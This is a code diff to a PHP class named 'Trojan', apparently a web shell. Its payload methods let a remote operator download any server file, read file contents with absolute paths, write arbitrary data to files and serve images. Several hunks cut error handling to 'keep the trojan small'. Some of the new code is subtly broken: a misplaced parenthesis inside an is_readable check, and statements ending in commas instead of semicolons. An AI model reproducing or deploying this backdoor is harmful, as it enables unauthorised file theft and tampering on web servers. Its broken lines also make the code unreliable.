@@ -1,12 +1,9 @@
 <?php
 
-// @note @todo: all trojans should support some kind of "help" command to show
-// you what payloads they're carrying
 class Trojan{
-    private $command         = '';
-    private $cwd             = '';
-    private $payloads        = array();
-    private $response        = array(
+    private $command  = '';
+    private $cwd      = '';
+    private $response = array(
         'error'          => null,
         'output'         => null,
         'prompt_context' => null,
@@ -139,7 +136,7 @@ class Trojan{
         # if the requested file exists, serve it up to the user
         if(file_exists($args['file'])){
             header('Content-Description: File Transfer');
-            header('Content-Type: application/octet-stream');
+            //header('Content-Type: application/octet-stream');
             header('Content-Disposition: attachment; filename='.basename($args['file']));
             header('Content-Transfer-Encoding: binary');
             //header('Expires: 0');
@@ -161,19 +158,12 @@ class Trojan{
         # cd to the appropriate directory
         chdir($this->cwd);
 
-        # verify file exists
-        if(!file_exists($args['file'])){
+        # Verify that file exists and is readable. (I'm combining these rather
+        # than doing them separately just to keep the trojan as small as
+        # possible.)
+        if(!is_readable($args['file'] || !file_exists($args['file']))){
             $this->response = array(
-                'error'          => 'The specified file does not exist.',
-                'prompt_context' => $this->prompt_context,
-            );
-            $this->send_response();
-        }
-
-        # verify file is readable
-        if(!is_readable($args['file'])){
-            $this->response = array(
-                'error'          => 'The specified file is not readable.',
+                'error'          => 'The specified file is not readable or does not exist.',
                 'prompt_context' => $this->prompt_context,
             );
             $this->send_response();
@@ -185,7 +175,6 @@ class Trojan{
             'output' => file_get_contents($args['file']),
             # also pass back the absolute path to the file being read
             'file'   => realpath($args['file']),
-
         );
         $this->response = array(
             'output'         => $output,
@@ -216,40 +205,15 @@ class Trojan{
         # cd to the appropriate directory
         chdir($this->cwd);
 
-        # verify file exists
-        if(!file_exists($args['file'])){
-            $this->response = array(
-                'error'          => 'The specified file does not exist.',
-                'prompt_context' => $this->prompt_context,
-            );
-            $this->send_response();
-        }
-
-        # verify file is writeable
-        if(!is_writeable($args['file'])){
-            $this->response = array(
-                'error'          => 'The specified file is not writeable.',
-                'prompt_context' => $this->prompt_context,
-            );
-            $this->send_response();
-        }
-
-        # if good, write the file
-        $success = file_put_contents($args['file'], $args['data']);
-
-        # notify the user of the result
-        if($success === false){
-            $this->response = array(
-                'error'          => 'Failed to write file.',
-                'prompt_context' => $this->prompt_context,
-            );
+        # Attempt to write the file, and notify the user of the result. Again,
+        # I'm combining several error checks here just to keep the trojan small.
+        if(file_put_contents($args['file'], $args['data']) === false){
+            $this->response['error'] = 'Failed to write file. It may not be writable, or may not exist.',
         }
         else {
-            $this->response = array(
-                'output'         => 'File written successfully.',
-                'prompt_context' => $this->prompt_context,
-            );
+            $this->response['output'] = 'File written successfully.',
         }
+        $this->response['prompt_context'] = $this->prompt_context;
         $this->send_response();
     }
 
@@ -260,19 +224,18 @@ class Trojan{
      */
     public function payload_image_view($args){
         # emulate directory persistence
-        $file = $args['file'];
         chdir($this->cwd);
 
         # if the requested file exists, serve it up to the user
-        if(file_exists($file)){
+        if(file_exists($args['file'])){
             # extract some image information
-            $image_data = getimagesize($file);
+            $image_data = getimagesize($args['file']);
             header("Content-Type: {$image_data['mime']}");
             //header("Expires: 0");
             //header("Cache-Control: must-revalidate");
             //header("Pragma: public");
             //header("Content-Length: " . filesize($file));
-            readfile($file);
+            readfile($args['file']);
         }
         
         # if not, provide a notification
